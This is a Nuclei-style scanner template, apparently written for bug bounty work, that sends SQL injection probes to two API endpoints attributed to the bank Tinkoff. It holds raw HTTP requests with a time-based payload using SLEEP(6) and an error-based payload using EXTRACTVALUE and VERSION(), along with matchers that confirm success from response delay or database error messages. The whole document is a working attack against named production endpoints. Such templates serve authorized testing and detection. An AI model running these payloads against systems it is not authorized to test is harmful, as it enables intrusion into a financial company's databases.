id: tinkoff-sqli

info:
  name: Tinkoff - SQL Injection
  author: bugbounty
  severity: critical
  description: Time-based and error-based SQL injection in API endpoints
  tags: sqli,tinkoff
  reference:
    - https://portswigger.net/web-security/sql-injection

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform=web&sessionid=test' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)-- HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

      - |
        GET /api/invest-gw/social/v1/post?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

    matchers-condition: or
    matchers:
      - type: dsl
        name: time-based-sqli
        dsl:
          - 'duration>=6'
          - 'status_code == 200'
        condition: and

      - type: regex
        name: error-based-sqli
        part: body
        regex:
          - "XPATH syntax error: '~[0-9]"
          - "supplied argument is not a valid MySQL"
          - "You have an error in your SQL syntax"
          - "Warning.*mysql_.*"
          - "PostgreSQL.*ERROR"
          - "ORA-[0-9]{5}"
        condition: or
